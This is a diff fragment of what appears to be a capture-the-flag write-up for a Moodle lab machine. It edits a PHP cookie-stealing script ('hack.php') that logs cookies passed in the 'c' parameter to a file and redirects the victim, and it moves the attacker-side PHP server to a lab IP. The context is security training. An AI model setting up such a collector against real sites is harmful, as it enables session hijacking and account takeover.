@@ -63,9 +63,9 @@ create php file "hack.php"
 header ('Location:http://moodle.schooled.htb');
 $cookies = $_GET["c"];
 $file = fopen('log.txt', 'a');
-fwrite($file, $cookies . "/n/n");
+fwrite($file, $cookies . "\n\n");
 ?>
 ```
-start php server with `sudo php -S 127.0.0.1:9001` on the location of the php file
+start php server with `sudo php -S 10.10.14.42:9001` on the location of the php file
 ## Dom
 Within javascript
